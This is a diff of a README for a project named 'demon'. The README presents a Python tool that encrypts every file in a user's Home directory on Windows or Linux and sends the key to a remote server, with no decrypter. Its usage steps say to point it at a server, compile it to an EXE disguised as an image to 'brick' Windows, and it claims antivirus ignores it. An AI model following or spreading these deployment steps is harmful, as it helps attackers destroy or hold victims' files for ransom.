@@ -1,18 +1,17 @@
 # demon
 fuck these demons, I am so triggered.
 
-Encrypts every file in your Home.
+Encrypts every file in your Home and sends the key to a remote server
 
 ***
 
-0. Works on both Windows and Linux.
+## Works on both Windows and Linux.
 
-1. Run server > run demon.py
-
-2. Compile demon.py to EXE, make it a nice image or some shit and brick your Windows.
-
-3. Anti-virusses don't give a damn.
+1. Put the remote server IP and port in "demon.py".
+2. Run server > run python demon.py -p <port>
+3. Compile demon.py to EXE, make it a nice image or some shit and brick your Windows.
+4. Anti-virusses don't give a damn.
 
 ***
 
-Maybe Ill add a decrypter someday also.
+Maybe I'll add a decrypter someday also.
